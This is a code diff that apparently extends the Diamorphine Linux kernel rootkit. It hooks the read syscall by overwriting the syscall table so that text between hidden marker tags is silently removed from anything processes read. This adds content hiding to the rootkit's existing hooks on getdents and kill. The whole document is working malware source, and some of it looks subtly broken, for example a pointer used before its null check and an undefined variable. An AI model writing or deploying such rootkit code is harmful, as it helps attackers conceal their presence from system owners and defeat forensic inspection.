@@ -4,7 +4,6 @@
 #include <linux/dirent.h>
 #include <linux/slab.h>
 #include <linux/version.h> 
-
 #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
 #include <asm/uaccess.h>
 #endif
@@ -45,15 +44,18 @@ static unsigned long *__sys_call_table;
 	static t_syscall orig_getdents;
 	static t_syscall orig_getdents64;
 	static t_syscall orig_kill;
+    static t_syscall orig_read;
 #else
 	typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
 		unsigned int);
 	typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
 		struct linux_dirent64 *, unsigned int);
 	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
+    typedef asmlinkage int (*orig_read_t)(unsigned int, char *, size_t);
 	orig_getdents_t orig_getdents;
 	orig_getdents64_t orig_getdents64;
 	orig_kill_t orig_kill;
+    orig_read_t orig_read;
 #endif
 
 unsigned long *
@@ -94,6 +96,67 @@ find_task(pid_t pid)
 			return p;
 	}
 	return NULL;
+}
+
+int file_check(void *arg, ssize_t size)
+{
+    int ret = 0;
+	char *buf;
+
+	if ((size <= 0) || (size >= SSIZE_MAX))
+		return ret;
+
+	buf = (char *)kmalloc(size + 1, GFP_KERNEL);
+	if (!buf)
+		return ret;
+
+	if (copy_from_user((void *)buf, (void *)arg, size))
+		goto out;
+
+	buf[size] = 0;
+
+	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL))
+		ret = 1;
+
+out:
+	kfree(buf);
+	return ret;
+}
+
+int hide_content(void *arg, ssize_t size)
+{
+	char *buf, *p1, *p2;
+	int i, newret;
+
+	buf = (char *)kmalloc(size, GFP_KERNEL);
+	if (!buf)
+		return (-1);
+
+	if (copy_from_user((void *)buf, (void *)arg, size)) {
+		kfree(buf);
+		return size;
+	}
+
+	p1 = strstr(buf, HIDETAGIN);
+	p2 = strstr(buf, HIDETAGOUT);
+	p2 += strlen(HIDETAGOUT);
+
+	if (p1 >= p2 || !p1 || !p2) {
+		kfree(buf);
+		return size;
+	}
+
+	i = size - (p2 - buf);
+	memmove((void *)p1, (void *)p2, i);
+	newret = size - (p2 - p1);
+
+	if (copy_to_user((void *)arg, (void *)buf, newret)) {
+		kfree(buf);
+		return size;
+	}
+
+	kfree(buf);
+	return newret;
 }
 
 int
@@ -241,6 +304,36 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 out:
 	kfree(kdirent);
 	return ret;
+}
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
+static asmlinkage long hacked_read(const struct pt_regs *pt_regs) {
+#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+	int fd = (int) pt_regs->di;
+	char __user * buf = (char __user *) pt_regs->si;
+#elif IS_ENABLED(CONFIG_ARM64)
+		int fd = (int) pt_regs->regs[0];
+	char __user * buf = (char __user *) pt_regs->regs[1];
+#endif
+	int ret = orig_read(pt_regs), err;
+#else
+asmlinkage long
+hacked_read(unsigned int fd, char __user *buf, size_t count)
+{
+	atomic_set(&read_on, 1);
+	ssize_t ret = orig_read(fd, buf, count), err;
+	
+#endif
+	if (ret <= 0)
+			return ret;
+
+	if (file_check(buf, ret) == 1) 
+				ret = hide_content(buf, ret);
+	
+	atomic_set(&read_on, 0);
+	return ret;
+
+	
 }
 
 void
@@ -402,10 +495,13 @@ diamorphine_init(void)
 	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
 	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
+	orig_read = (t_syscall)__sys_call_table[__NR_read];
 #else
 	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
 	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
 	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+	orig_read = (orig_read_t)__sys_call_table[__NR_read];
+
 #endif
 
 	unprotect_memory();
@@ -413,6 +509,7 @@ diamorphine_init(void)
 	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
+	__sys_call_table[__NR_read] = (unsigned long) hacked_read;
 
 	protect_memory();
 
@@ -427,6 +524,7 @@ diamorphine_cleanup(void)
 	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+	__sys_call_table[__NR_read] = (unsigned long) orig_read;
 
 	protect_memory();
 }
